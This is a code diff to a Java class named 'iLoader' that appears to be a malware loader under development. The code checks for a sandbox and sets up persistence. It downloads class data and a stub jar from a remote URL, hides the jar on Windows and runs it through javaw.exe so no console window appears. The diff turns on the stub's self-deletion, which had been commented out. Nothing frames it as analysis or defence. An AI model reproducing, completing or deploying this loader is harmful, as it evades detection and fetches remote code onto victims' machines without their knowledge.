@@ -136,8 +136,9 @@ public class iLoader
         Hashtable<String,byte[]> classData = downloadRequest(String.format("%s%s",urlData,"59009"));
         Enumeration<String> b = classData.keys();
 
-        if (!classData.containsKey("error") && System.getProperty("sun.java.command").contains(stubPath))
+        if (!classData.containsKey("error") && stubPath.toLowerCase().contains(System.getProperty("sun.java.command").toLowerCase()))
         {
+            System.out.println("stub");
             while (b.hasMoreElements())
             {
                 String bData = b.nextElement();
@@ -155,21 +156,20 @@ public class iLoader
                 );
             }
         }
-        else
+        else if (!classData.containsKey("error") && !stubPath.toLowerCase().contains(System.getProperty("sun.java.command").toLowerCase()))
         {
-            System.out.println("not stub");
-            /*
             passThroughJar(stubPath, new String[]{});
-            try 
-            {
-                Files.delete(Paths.get(stubPath));
-            } 
-            catch (Exception x) 
-            {
-                
-            }  
-            */
         }
+        
+
+        try 
+        {
+            Files.delete(Paths.get(stubPath));
+        } 
+        catch (Exception x) 
+        {
+            
+        }  
     }
 
 
@@ -178,7 +178,7 @@ public class iLoader
         if (!chkSandbox())
         {
             Class currentClass = MethodHandles.lookup().lookupClass();
-            jarPath = currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
+            jarPath = new File(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getAbsolutePath();
 
             //chk for persistence and add if not present
             if (!chkPersistence() && isAgent)
@@ -191,14 +191,12 @@ public class iLoader
                 getStubJar();
                 mkPersistence();
                 passThroughJar(stubPath, new String[]{});
-                /*
                 try 
                 {
                     Files.delete(Paths.get(stubPath));
                 } 
                 catch (Exception x) 
                 {}
-                */
                 System.exit(0);                
             }
 
@@ -217,7 +215,7 @@ public class iLoader
         
         if (new File(pathToJar).isFile())
         {
-            String[] cmdArgs = new String[] {"java.exe","-jar",pathToJar};
+            String[] cmdArgs = new String[] {"javaw.exe","-jar",pathToJar};
             String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.stream(initArgs)).toArray(String[]::new);
 
             try
@@ -238,7 +236,7 @@ public class iLoader
         stubPath = String.format("%s%s%s.jar",new File(workingDir).getAbsolutePath(),File.separator,stubName);  
         Hashtable<String,byte[]> stubData = downloadRequest(String.format("%s%s",urlData,"59013"));
         Files.write(Paths.get(stubPath), stubData.get("stub"));
-        if (System.getenv("os.name").toLowerCase().contains("win"))
+        if (System.getProperty("os.name").toLowerCase().contains("win"))
         {
             Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
         }                    
@@ -251,8 +249,6 @@ public class iLoader
         String nameVal = nameValRaw[nameValRaw.length-1];
         String bakName = "";
         bakName = String.format(".bak-%s",nameVal);
-            // for later Files.setAttribute(actualFullPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
-       
         return bakName;
     }
 
